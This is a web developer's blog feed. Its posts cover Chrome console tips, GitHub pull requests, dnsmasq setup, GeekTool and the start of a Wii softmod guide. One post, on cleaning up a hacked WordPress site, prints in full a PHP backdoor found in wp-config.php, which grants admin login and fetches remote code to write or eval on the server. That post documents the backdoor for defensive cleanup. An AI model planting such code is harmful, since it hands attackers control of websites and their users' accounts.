&lt;p&gt;We&amp;#39;ve all been there - playing with a DOM node in the elements tab, but now we need to use JavaScript on it. We could do a regular DOM traversal to find it, but then we have to remember the ID or tag name, maybe even some obscure combination involving classes. If you switch to the Console tab on the Developer Tools, you can always grab the latest node you had selected using the &lt;code&gt;$0&lt;/code&gt; variable shortcut. In Chrome, this can even be expanded upon up to &lt;code&gt;$4&lt;/code&gt; - that&amp;#39;s the latest five elements you had selected.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$0&lt;/code&gt; - &lt;code&gt;$4&lt;/code&gt; are direct references to the DOM nodes, so you can start manipulating it directly by grabbing the inner text (&lt;code&gt;$0.innerText&lt;/code&gt;) or passing it to jQuery for manipulation (&lt;code&gt;$($0)&lt;/code&gt;). While on the subject, did you know Chrome also provides an alias to &lt;code&gt;document.querySelectorAll&lt;/code&gt; under &lt;code&gt;$$&lt;/code&gt; and &lt;code&gt;document.querySelector&lt;/code&gt; under &lt;code&gt;$&lt;/code&gt; (if jQuery hasn&amp;#39;t overwritten it of course).&lt;/p&gt;
&lt;h2 id=&quot;other-useful-console-functions&quot;&gt;Other Useful Console Functions&lt;/h2&gt;
&lt;p&gt;Don&amp;#39;t despair yet, Chrome still has a wealth of functions at your debugging disposal. For your timing purposes, there is &lt;code&gt;console.time&lt;/code&gt; and &lt;code&gt;console.timeEnd&lt;/code&gt;. Each accept a single string as the name of the timer to stop and start. Even cooler is &lt;code&gt;console.assert&lt;/code&gt;, which accepts two parameters - the check and a string - and logs an assertion failure with the string when the check is falsy.&lt;/p&gt;
&lt;p&gt;An interesting addition is &lt;code&gt;console.table&lt;/code&gt;, which allows you to log an array of similar objects in a readable fashion. It accepts the array of objects as the first parameter, but also accepts a second parameter as the object keys you want to log.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;console-table.png&quot; alt=&quot;Demonstrating console.table&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;using-the-console&quot;&gt;Using the Console&lt;/h2&gt;
&lt;p&gt;Whenever you are working in the console, hitting &lt;code&gt;Enter&lt;/code&gt; will cause the content of the console to be evaluated and output to the screen. You can optionally use &lt;code&gt;Shift + Enter&lt;/code&gt; to work over multiple lines, then just use &lt;code&gt;Enter&lt;/code&gt; as usual to trigger evaluation. If you want to continue working on the code that was previously evaluated, just press the &lt;code&gt;Up&lt;/code&gt; arrow - just like using the command line. The result of the previous evaluation is even stored in the variable &lt;code&gt;$_&lt;/code&gt;, so you can use it in your next evaluation.&lt;/p&gt;
&lt;h2 id=&quot;other-tips-and-tricks&quot;&gt;Other Tips and Tricks&lt;/h2&gt;
&lt;p&gt;The Chrome console also provides a function called &lt;code&gt;monitorEvents&lt;/code&gt; that works exactly as described. It accepts an DOM node to monitor as the first argument and by default it&amp;#39;ll monitor and log all the events. Optionally, you could pass in the string &lt;code&gt;&amp;quot;mouse&amp;quot;&lt;/code&gt; or &lt;code&gt;&amp;quot;key&amp;quot;&lt;/code&gt; to log only mouse or keyboard based events.&lt;/p&gt;
&lt;p&gt;Conveniently, Chrome also provides an &lt;code&gt;inspect&lt;/code&gt; method which I feel is almost the opposite to &lt;code&gt;$0&lt;/code&gt;. It will open the elements panel and focus on the element within the DOM tree. There is even a &lt;code&gt;copy&lt;/code&gt; method to copy stuff to your clipboard.&lt;/p&gt;
&lt;p&gt;Somewhat less used, but Chrome also provides a &lt;code&gt;keys&lt;/code&gt; function - which maps to &lt;code&gt;Object.keys&lt;/code&gt; - and a &lt;code&gt;values&lt;/code&gt; function, which is the polar opposite of keys.&lt;/p&gt;
&lt;p&gt;And if at some point you just feel like a chump using your mouse and clicking to clear the console, it&amp;#39;ll be welcome news that there is even a &lt;code&gt;clear&lt;/code&gt; function that can do it for you (and &lt;code&gt;Ctrl + L&lt;/code&gt; keyboard shortcut!). And remember, you can always persist the console over page reloads by right clicking and selecting &amp;quot;Preserve Log upon Navigation&amp;quot;.&lt;/p&gt;
</description></item><item><title>Contributing to Open Source</title><link>http://blakeembrey.com/articles/2013/04/contributing-to-open-source</link><pubDate>Wed, 03 Apr 2013 20:35:00 +1100</pubDate><guid isPermaLink="true">http://blakeembrey.com/articles/2013/04/contributing-to-open-source</guid><author>Blake Embrey</author><description>&lt;blockquote&gt;
&lt;p&gt;“Software is like sex; it&amp;#39;s better when it&amp;#39;s free.” - Linus Torvalds&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Being able to contribute to open source is an awesome feeling. The feeling of having code which thousands, if not millions, of people will run everyday is enough to make you cringe. Surprisingly though, few people realize how empowering, yet simple, contributing to an open source project can be.&lt;/p&gt;
&lt;p&gt;In this article I am going to run you through what my usual process looks like when issuing a pull request through GitHub, and what sort of things to expect.&lt;/p&gt;
&lt;h2 id=&quot;first-steps&quot;&gt;First Steps&lt;/h2&gt;
&lt;p&gt;The first thing you&amp;#39;ll need is an open source library or project that you are passionate about. Finding a library that fits this criteria can be difficult, but I am sure there are a dozen of projects you take for granted everyday. It&amp;#39;s unlikely you even realize how many issues some libraries have backlogged to work through.&lt;/p&gt;
&lt;p&gt;Once you have found a project you are interested in contributing to, chances are it&amp;#39;s on GitHub. If it&amp;#39;s not on GitHub, repeat the previous step. For the purpose of this blog post, I&amp;#39;ll be running with &lt;a href=&quot;https://github.com/LearnBoost/stylus/issues/989&quot;&gt;this issue from Stylus&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://f.cl.ly/items/2n2R1S3M291X3V1k110C/CapturFiles_1.png&quot; alt=&quot;Stylus issue on GitHub&quot;&gt;&lt;/p&gt;
&lt;p&gt;The first thing you&amp;#39;ll need to do is fork the repo. This is done by clicking the &lt;code&gt;Fork&lt;/code&gt; button in the top right of GitHub. Once you fork the repo, you&amp;#39;ll have your own personal copy of the original repo that you can do what you want with. From there, you&amp;#39;ll want to use you command line to clone the repo off GitHub.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://f.cl.ly/items/0s0V12453x0X3Z102i1Z/CapturFiles_3.png&quot; alt=&quot;Local Stylus Fork&quot;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git clone git@github.com:blakeembrey/stylus.git
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;After cloning the repository, you&amp;#39;ll now have a local copy on your machine. My next step is usually to set up the &lt;code&gt;upstream&lt;/code&gt; repository link for pulling down code.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git remote add upstream git@github.com:LearnBoost/stylus.git
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The next step is to create a branch, normally based on the name or description of the issue you are trying to solve. You don&amp;#39;t want to make your changes in the &lt;code&gt;master&lt;/code&gt; branch as it will make future updates and pull requests more difficult to do.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git checkout -b media-query-colon
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;With that command, I&amp;#39;ll quickly create a new branch based off &lt;code&gt;master&lt;/code&gt; and switch to it. The first thing you&amp;#39;ll want to do before writing any code is try and find the test suite for the project (hopefully they have one). This is the most useful thing I find during development, especially when it&amp;#39;s a library I&amp;#39;m not entire familiar with. With Stylus, I know I can find the test script under the scripts section the &lt;code&gt;package.json&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;npm test
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&quot;http://f.cl.ly/items/0f0x1n22031F3j3E060D/CapturFiles_4.png&quot; alt=&quot;Command Line after working through the previous steps&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;committing-your-work&quot;&gt;Committing your work&lt;/h2&gt;
&lt;p&gt;Running the test script should quickly give an overview of how the library is constructed and the current status of the library. Most of the time, all tests should be passing - otherwise this would mean more bugs that need fixing.&lt;/p&gt;
&lt;p&gt;After running the test script, I usually find it useful to whip up a new test based on the issue you are trying to solve - which will be failing initially. This is known as Test Driven Development (TDD), and will be crucial as you explore the core of some libraries. Make sure to add as many test cases to demostrate the issue and fix, which will also stop future regressions.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;In lieu of a formal styleguide, take care to maintain the existing coding style.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;When contributing to someone elses library, you&amp;#39;ll want to make sure your coding style is matching the code which already exists. This is an important concept to understand, as it makes future commits easier to read through when all the code is consistent. &lt;a href=&quot;https://github.com/rwldrn/idiomatic.js/#all-code-in-any-code-base-should-look-like-a-single-person-typed-it-no-matter-how-many-people-contributed&quot;&gt;All code in any code-base should look like a single person typed it, no matter how many people contributed&lt;/a&gt;. You may find that some projects also include a &lt;a href=&quot;https://github.com/twitter/bootstrap/blob/master/CONTRIBUTING.md&quot;&gt;CONTRIBUTING.md&lt;/a&gt; file.&lt;/p&gt;
&lt;p&gt;Somewhere during this time you&amp;#39;ll want to commit your changes. Next, we&amp;#39;ll want to push our changes back to the remote repository we cloned from earlier (&lt;code&gt;git push -u origin media-query-colon&lt;/code&gt;). This will create a new branch on the remote repo to track from. Once the code is pushed back up to GitHub, you can create a pull request from your repo back to the original (&lt;code&gt;upstream&lt;/code&gt;).&lt;/p&gt;
&lt;h2 id=&quot;creating-a-pull-request&quot;&gt;Creating a pull request&lt;/h2&gt;
&lt;p&gt;When creating the pull request, it is vital to provide a descriptive title and contents - anyone reading the issue should understand what your trying to achieve before reading any code. If there are similar issues or you were fixing an existing issue, make sure to take a note of the issue numbers in the issue description. You can even make a reference to another repo if it affects it - this shows the impact of your change and demostrates the priority of your patch.&lt;/p&gt;
&lt;h2 id=&quot;keeping-it-relevant&quot;&gt;Keeping it relevant&lt;/h2&gt;
&lt;p&gt;Chances are, by now there have been new commits created since you forked the repo, or perhaps your commit history for the issue is just getting a little unwieldly. Fortunately there is a simple utility built into git for this known as rebasing.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git checkout master
git pull upstream master
git checkout media-query-colon
git rebase -i master # Interactively rebase
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&quot;http://f.cl.ly/items/1k3N1Q1I282p3Y3J233L/CapturFiles_6.png&quot; alt=&quot;Rebase process&quot;&gt;&lt;/p&gt;
&lt;p&gt;A rebase will rewrite your commit history, so you can squash commits together into a single commit and clean up all the changes you have made. It&amp;#39;ll also move the commits to be the lastest in the commit log. Because the history will be rewritten, next time you push you&amp;#39;ll probably need to use the force push flag which overrides the remote commit (&lt;code&gt;git push -f&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;Luckily, with the way GitHub works, any commits in the branch - new or old -  will be appended to your pull request. This makes is simple to quickly iterate on any issues raised by fellow developers or the project owner.&lt;/p&gt;
&lt;h2 id=&quot;completion&quot;&gt;Completion&lt;/h2&gt;
&lt;p&gt;Now you are likely done. Depending on the repo and repo owner(s), it could take anywhere from a few minutes to a few months for your pull request to be reviewed. It won&amp;#39;t always be perfect, and it may be denied. In the case of your pull request being denied, check out the feedback - it&amp;#39;ll usually be really useful and maybe even give you an idea of where to go from there. If not, there are always more repos in need of contributors.&lt;/p&gt;
</description></item><item><title>Simplify Local Development with Dnsmasq</title><link>http://blakeembrey.com/articles/2012/04/local-development-with-dnsmasq</link><pubDate>Tue, 24 Apr 2012 07:28:00 +1000</pubDate><guid isPermaLink="true">http://blakeembrey.com/articles/2012/04/local-development-with-dnsmasq</guid><author>Blake Embrey</author><description>&lt;p&gt;Ever wanted to be able to set up your local domains instantly and never have to worry about your &lt;code&gt;/etc/hosts&lt;/code&gt; again? Me too! A bit of looking around and I discovered a wealth of information about a small &lt;em&gt;DNS Forwarder&lt;/em&gt; called DNSMASQ.&lt;/p&gt;
&lt;p&gt;So, this is great. We have our solution - it&amp;#39;s a tiny program barely taking 700KB of RAM, and it&amp;#39;s a cinch to set up. By the end of this post, you will have a working TLD for use with your local development applications. No more playing with your &lt;code&gt;/etc/hosts&lt;/code&gt; file every time you want to add a new domain.&lt;/p&gt;
&lt;p&gt;In this tutorial, I will be focusing on Mac as it is the OS I use, however, the instructions should be fairly similar on linux. It has been tested in Mountain Lion and should work without a hiccup all the way down to Leopard (probably lower).&lt;/p&gt;
&lt;p&gt;First of all, if you haven&amp;#39;t installed it already, we will install &lt;strong&gt;homebrew&lt;/strong&gt; - the missing package manager for OS X. To install, just follow the instructions available on &lt;a href=&quot;http://mxcl.github.com/homebrew/&quot;&gt;the homepage&lt;/a&gt; or just copy and paste this snippet into terminal:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/usr/bin/ruby -e &amp;quot;$(/usr/bin/curl -fksSL https://raw.github.com/mxcl/homebrew/master/Library/Contributions/install_homebrew.rb)&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Once brew is installed, we&amp;#39;ll install dnsmasq using &lt;code&gt;brew install dnsmasq&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Next, let&amp;#39;s activate dnsmasq. Homebrew should have output some hints on how to get started, but in case you missed it  should be something along these lines.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;cp /usr/local/Cellar/dnsmasq/2.57/dnsmasq.conf.example /usr/local/etc/dnsmasq.conf
sudo cp /usr/local/Cellar/dnsmasq/2.57/homebrew.mxcl.dnsmasq.plist /Library/LaunchDaemons
sudo launchctl load -w /Library/LaunchDaemons/homebrew.mxcl.dnsmasq.plist
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Brilliant, now let&amp;#39;s modify our configuration file at &lt;code&gt;/usr/local/etc/dnsmasq.conf&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;We&amp;#39;ll add two rules. The first is the address, or TLD, we will listen to. In this case we will use &lt;code&gt;.dev&lt;/code&gt;, but you can use anything (except &lt;code&gt;.local&lt;/code&gt; - &lt;a href=&quot;http://www.justincarmony.com/blog/2011/07/27/mac-os-x-lion-etc-hosts-bugs-and-dns-resolution/&quot;&gt;not a good idea&lt;/a&gt;)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;address=/dev/127.0.0.1
listen-address=127.0.0.1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;To start and stop dnsmasq, simply use&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo launchctl stop homebrew.mxcl.dnsmasq &amp;amp;&amp;amp; sudo launchctl start homebrew.mxcl.dnsmasq
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;However, I found it even easier to just kill the script in the Activity Monitor. For the final step, add &lt;code&gt;127.0.0.1&lt;/code&gt; as a name server in &lt;code&gt;System Preferences -&amp;gt; Network -&amp;gt; Advanced -&amp;gt; DNS&lt;/code&gt;. You can add it along with some other DNS records, just make sure it&amp;#39;s at the top. For example, I use Google&amp;#39;s Public DNS - &lt;code&gt;8.8.8.8&lt;/code&gt; and &lt;code&gt;8.8.4.4&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Now in whichever language you are writing in, you should be able to easily set up your virtual hosts for use on the &lt;code&gt;.dev&lt;/code&gt; TLD. You should be even able to see your name server setup using &lt;code&gt;scutil --dns&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;References:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://serverfault.com/a/164215&quot;&gt;ServerFault Question&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://blog.philippklaus.de/2012/02/install-dnsmasq-locally-on-mac-os-x-via-homebrew/&quot;&gt;Install DNSmasq locally on Mac OS X via Homebrew&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description></item><item><title>Change Desktop Background with Shell and GeekTool</title><link>http://blakeembrey.com/articles/2011/10/geektool-change-desktop-background</link><pubDate>Sun, 30 Oct 2011 12:00:00 +1100</pubDate><guid isPermaLink="true">http://blakeembrey.com/articles/2011/10/geektool-change-desktop-background</guid><author>Blake Embrey</author><description>&lt;p&gt;Make an AppleScript and run it using the &amp;quot;Shell&amp;quot; geeklet provided in GeekTool. First, we’ll make the &amp;#39;AppleScript&amp;#39;. So, open the AppleScript Editor app to get started. Copy and paste this code:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;tell application &amp;quot;Finder&amp;quot;
  set desktop picture to POSIX file &amp;quot;file://localhost/  yourimage.png&amp;quot;
end tell
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then, replace &lt;code&gt;file://localhost/yourimage.png&lt;/code&gt; with the location to your image. It must be an absolute path to the image, so you might want to make a folder just for your GeekTool scripts somewhere. For example, I want to use the Tron background image, so I used &lt;code&gt;file://localhost/Users/blakeembrey/Dropbox/Application Settings/GeekTool/TronLegacy.png&lt;/code&gt;. I am currently storing my GeekTool scripts in an &amp;#39;Applications&amp;#39; folder inside my documents, as you can see. Once I finished that, I saved the script as &lt;code&gt;setTronBackground&lt;/code&gt; in the same folder.&lt;/p&gt;
&lt;p&gt;Now in Geektool, drag the shell geeklet to the desktop from GeekTool. It doesn’t matter where it goes since it isn’t going to be seen anyway. Set the &amp;#39;group&amp;#39; you would like it to be a part of, then set the &amp;#39;Refresh Every&amp;#39; to 0. For the shell code, we are going to use something like&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;osascript ~/Documents/Applications/GeekTool/setTronBackground.scpt
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Notice we can use the relative location here, and that we need .scpt for the file extension. Finally, save and close GeekTool. Now every time you change the theme you will also change the background image.&lt;/p&gt;
</description></item><item><title>Warning - Something's Not Right Here</title><link>http://blakeembrey.com/articles/2011/09/warning-somethings-not-right</link><pubDate>Fri, 30 Sep 2011 12:00:00 +1000</pubDate><guid isPermaLink="true">http://blakeembrey.com/articles/2011/09/warning-somethings-not-right</guid><author>Blake Embrey</author><description>&lt;p&gt;&lt;img src=&quot;warning.png&quot; alt=&quot;Chrome is broken :/&quot;&gt;&lt;/p&gt;
&lt;p&gt;About two days ago, I received a warning from Google saying my website has been exploited and hacked. Of course, the emails they sent I never received, so I didn’t realise I had an issue until about an hour ago. My first reaction was OMG, WTF! I knew it most likely had something to do with the recent TimThumb exploit, but I didn’t even know my theme had TimThumb included. I also looked at the Google diagnostic repost which it linked me to, which I found the malware related to &lt;code&gt;counter-wordpress.com&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;First of all, I would advise running the script found at &lt;a href=&quot;http://blog.sucuri.net/2011/08/timthumb-php-security-vulnerability-just-the-tip-of-the-iceberg.html&quot;&gt;Sucuri&lt;/a&gt;. Then, scan your site using the &lt;a href=&quot;http://sitecheck.sucuri.net/scanner/&quot;&gt;Sucuri Site Scanner&lt;/a&gt; to find out which pages they have exploited and how. This is the best little site I have found for this, and I would definitely bookmark it for future reference as well if I were you.&lt;/p&gt;
&lt;p&gt;Extremely quickly, I jumped to action. This is the exact steps I took and you can take too, to remove the exploits from your code:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Delete the following files:&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;wp-admin/upd.php
wp-content/upd.php
&lt;/code&gt;&lt;/pre&gt;&lt;ol&gt;
&lt;li&gt;Log into WordPress admin and reinstall your WordPress version. We are focusing on these three files:&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;wp-settings.php
wp-includes/js/jquery/jquery.js
wp-includes/js/l10n.js
&lt;/code&gt;&lt;/pre&gt;&lt;ol&gt;
&lt;li&gt;Open &amp;quot;&lt;code&gt;wp-config.php&lt;/code&gt;&amp;quot; and look for anything that seems out of place. In mine, I found a script which appears to harvest login credentials/cookies, which found on the 2000 or so line. Above and a few thousand lines below were all blank:&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&quot;lang-php&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;hljs-keyword&quot;&gt;isset&lt;/span&gt;(&lt;span class=&quot;hljs-variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;hljs-string&quot;&gt;'pingnow'&lt;/span&gt;])&amp;amp;&amp;amp; &lt;span class=&quot;hljs-keyword&quot;&gt;isset&lt;/span&gt;(&lt;span class=&quot;hljs-variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;hljs-string&quot;&gt;'pass'&lt;/span&gt;])){
&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;hljs-variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;hljs-string&quot;&gt;'pass'&lt;/span&gt;] == &lt;span class=&quot;hljs-string&quot;&gt;'19ca14e7ea6328a42e0eb13d585e4c22'&lt;/span&gt;){
&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;hljs-variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;hljs-string&quot;&gt;'pingnow'&lt;/span&gt;]== &lt;span class=&quot;hljs-string&quot;&gt;'login'&lt;/span&gt;){
&lt;span class=&quot;hljs-variable&quot;&gt;$user_login&lt;/span&gt; = &lt;span class=&quot;hljs-string&quot;&gt;'admin'&lt;/span&gt;;
&lt;span class=&quot;hljs-variable&quot;&gt;$user&lt;/span&gt; = get_userdatabylogin(&lt;span class=&quot;hljs-variable&quot;&gt;$user_login&lt;/span&gt;);
&lt;span class=&quot;hljs-variable&quot;&gt;$user_id&lt;/span&gt; = &lt;span class=&quot;hljs-variable&quot;&gt;$user&lt;/span&gt;-&amp;gt;ID;
wp_set_current_user(&lt;span class=&quot;hljs-variable&quot;&gt;$user_id&lt;/span&gt;, &lt;span class=&quot;hljs-variable&quot;&gt;$user_login&lt;/span&gt;);
wp_set_auth_cookie(&lt;span class=&quot;hljs-variable&quot;&gt;$user_id&lt;/span&gt;);
do_action(&lt;span class=&quot;hljs-string&quot;&gt;'wp_login'&lt;/span&gt;, &lt;span class=&quot;hljs-variable&quot;&gt;$user_login&lt;/span&gt;);
}
&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; ((&lt;span class=&quot;hljs-variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;hljs-string&quot;&gt;'pingnow'&lt;/span&gt;]== &lt;span class=&quot;hljs-string&quot;&gt;'exec'&lt;/span&gt;)&amp;amp;&amp;amp;(&lt;span class=&quot;hljs-keyword&quot;&gt;isset&lt;/span&gt;(&lt;span class=&quot;hljs-variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;hljs-string&quot;&gt;'file'&lt;/span&gt;]))){
&lt;span class=&quot;hljs-variable&quot;&gt;$ch&lt;/span&gt; = curl_init(&lt;span class=&quot;hljs-variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;hljs-string&quot;&gt;'file'&lt;/span&gt;]);
&lt;span class=&quot;hljs-variable&quot;&gt;$fnm&lt;/span&gt; = md5(rand(&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;,&lt;span class=&quot;hljs-number&quot;&gt;100&lt;/span&gt;)).&lt;span class=&quot;hljs-string&quot;&gt;'.php'&lt;/span&gt;;
&lt;span class=&quot;hljs-variable&quot;&gt;$fp&lt;/span&gt; = fopen(&lt;span class=&quot;hljs-variable&quot;&gt;$fnm&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;w&quot;&lt;/span&gt;);
curl_setopt(&lt;span class=&quot;hljs-variable&quot;&gt;$ch&lt;/span&gt;, CURLOPT_FILE, &lt;span class=&quot;hljs-variable&quot;&gt;$fp&lt;/span&gt;);
curl_setopt(&lt;span class=&quot;hljs-variable&quot;&gt;$ch&lt;/span&gt;, CURLOPT_HEADER, &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;);
curl_setopt(&lt;span class=&quot;hljs-variable&quot;&gt;$ch&lt;/span&gt;, CURLOPT_TIMEOUT, &lt;span class=&quot;hljs-number&quot;&gt;5&lt;/span&gt;);
curl_exec(&lt;span class=&quot;hljs-variable&quot;&gt;$ch&lt;/span&gt;);
curl_close(&lt;span class=&quot;hljs-variable&quot;&gt;$ch&lt;/span&gt;);
fclose(&lt;span class=&quot;hljs-variable&quot;&gt;$fp&lt;/span&gt;);
&lt;span class=&quot;hljs-keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;&amp;lt;SCRIPT LANGUAGE=&quot;&lt;/span&gt;JavaScript&lt;span class=&quot;hljs-string&quot;&gt;&quot;&amp;gt;location.href='$fnm';&amp;lt;/SCRIPT&amp;gt;&quot;&lt;/span&gt;;
}
&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; ((&lt;span class=&quot;hljs-variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;hljs-string&quot;&gt;'pingnow'&lt;/span&gt;]== &lt;span class=&quot;hljs-string&quot;&gt;'eval'&lt;/span&gt;)&amp;amp;&amp;amp;(&lt;span class=&quot;hljs-keyword&quot;&gt;isset&lt;/span&gt;(&lt;span class=&quot;hljs-variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;hljs-string&quot;&gt;'file'&lt;/span&gt;]))){
&lt;span class=&quot;hljs-variable&quot;&gt;$ch&lt;/span&gt; = curl_init(&lt;span class=&quot;hljs-variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;hljs-string&quot;&gt;'file'&lt;/span&gt;]);
curl_setopt(&lt;span class=&quot;hljs-variable&quot;&gt;$ch&lt;/span&gt;, CURLOPT_RETURNTRANSFER, &lt;span class=&quot;hljs-keyword&quot;&gt;true&lt;/span&gt;);
curl_setopt(&lt;span class=&quot;hljs-variable&quot;&gt;$ch&lt;/span&gt;, CURLOPT_HEADER, &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;);
curl_setopt(&lt;span class=&quot;hljs-variable&quot;&gt;$ch&lt;/span&gt;, CURLOPT_TIMEOUT, &lt;span class=&quot;hljs-number&quot;&gt;5&lt;/span&gt;);
&lt;span class=&quot;hljs-variable&quot;&gt;$re&lt;/span&gt; = curl_exec(&lt;span class=&quot;hljs-variable&quot;&gt;$ch&lt;/span&gt;);
curl_close(&lt;span class=&quot;hljs-variable&quot;&gt;$ch&lt;/span&gt;);
&lt;span class=&quot;hljs-keyword&quot;&gt;eval&lt;/span&gt;(&lt;span class=&quot;hljs-variable&quot;&gt;$re&lt;/span&gt;);
}}}
&lt;/code&gt;&lt;/pre&gt;
&lt;ol&gt;
&lt;li&gt;In your theme, look for anywhere the TimThumb script may be storing the cached files. These are generally along the lines of:&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;wp-content/themes/theme-name/scripts/cache/external_{MD5Hash}.php
wp-content/themes/theme-name/temp/cache/external_{MD5Hash}.php
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If you found anything like the above, delete it straight away. If you&amp;#39;re not sure, delete every file that isn’t an image.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Replace &lt;code&gt;timthumb.php&lt;/code&gt; with the latest version found at &lt;code&gt;http://timthumb.googlecode.com/svn/trunk/timthumb.php&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Change your MySQL and login password and update wp-config.php to correspond with the update.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Change the secret keys in &lt;code&gt;wp-config.php&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Clear your browsers cache and cookies.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Empty any page caching plugins you may have enabled to push the updates through to your visitors.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Throughout this, I also found a botting script and some spam black hat links. Make sure you scan your site using the &lt;a href=&quot;http://sitecheck.sucuri.net/scanner/&quot;&gt;Sucuri Site Scanner&lt;/a&gt; once again to make sure you removed all the exploits. When you are sure you have removed everything, submit your site to Google for review. This can be done in the &lt;code&gt;Diagnostics -&amp;gt; Malware&lt;/code&gt; tab of your Google Webmaster account. To keep up with anymore potential exploits, I would recommend following their fantastic blog found at &lt;a href=&quot;http://blog.sucuri.net/&quot;&gt;blog.sucuri.net&lt;/a&gt;.&lt;/p&gt;
</description></item><item><title>Jailbreak Wii (Softmod) 3.0 – 4.2</title><link>http://blakeembrey.com/articles/2011/04/wii-jailbreak-3-0-4-2</link><pubDate>Tue, 12 Apr 2011 12:00:00 +1000</pubDate><guid isPermaLink="true">http://blakeembrey.com/articles/2011/04/wii-jailbreak-3-0-4-2</guid><author>Blake Embrey</author><description>&lt;p&gt;&lt;img src=&quot;channel.png&quot; alt=&quot;Homebrew Channel&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;IMPORTANT: This information is for research and academic purposes only! This info is not to be abused! I am not responsible for any damage that you may create!&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Although I did successfully complete this guide on my own Wii console, it does not mean that this same process will successfully jailbreak your Wii console. Make sure you read and complete all steps appropriately.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Prerequisites&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Check your Wii version. This can be done by going to &lt;code&gt;Wii Settings -&amp;gt; Top Right Corner -&amp;gt; Your Wii&amp;#39;s Firmware &amp;amp; Region&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Jailbreak file [3.0-4.1] – &lt;a href=&quot;http://www.mediafire.com/?rv3w0le0nrf7mm1&quot;&gt;Mediafire&lt;/a&gt; (Password is &lt;code&gt;wiihacks&lt;/code&gt;)&lt;/li&gt;
